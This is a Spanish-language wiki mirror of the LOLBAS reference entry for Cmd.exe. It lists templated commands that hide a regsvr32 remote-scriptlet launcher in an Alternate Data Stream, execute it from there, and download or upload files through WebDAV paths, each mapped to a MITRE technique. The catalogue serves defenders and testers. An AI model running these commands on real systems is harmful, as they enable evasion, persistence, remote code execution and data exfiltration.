# LOLBAS: Cmd.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `ADS`, `Download`, `Upload`

The command-line interpreter in Windows

## Comandos

### Can be used to evade defensive countermeasures or to hide as a persistence mechanism

ADS · priv: User · T1564.004

```cmd
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat
```

Add content to an Alternate Data Stream (ADS).

### Can be used to evade defensive countermeasures or to hide as a persistence mechanism

ADS · priv: User · T1059.003

```cmd
cmd.exe - < {PATH}:payload.bat
```

Execute payload.bat stored in an Alternate Data Stream (ADS).

### Download/copy a file from a WebDAV server

Download · priv: User · T1105

```cmd
type {PATH_SMB} > {PATH_ABSOLUTE}
```

Downloads a specified file from a WebDAV server to the target file.

### Upload a file to a WebDAV server

Upload · priv: User · T1048.003

```cmd
type {PATH_ABSOLUTE} > {PATH_SMB}
```

Uploads a specified file to a WebDAV server.

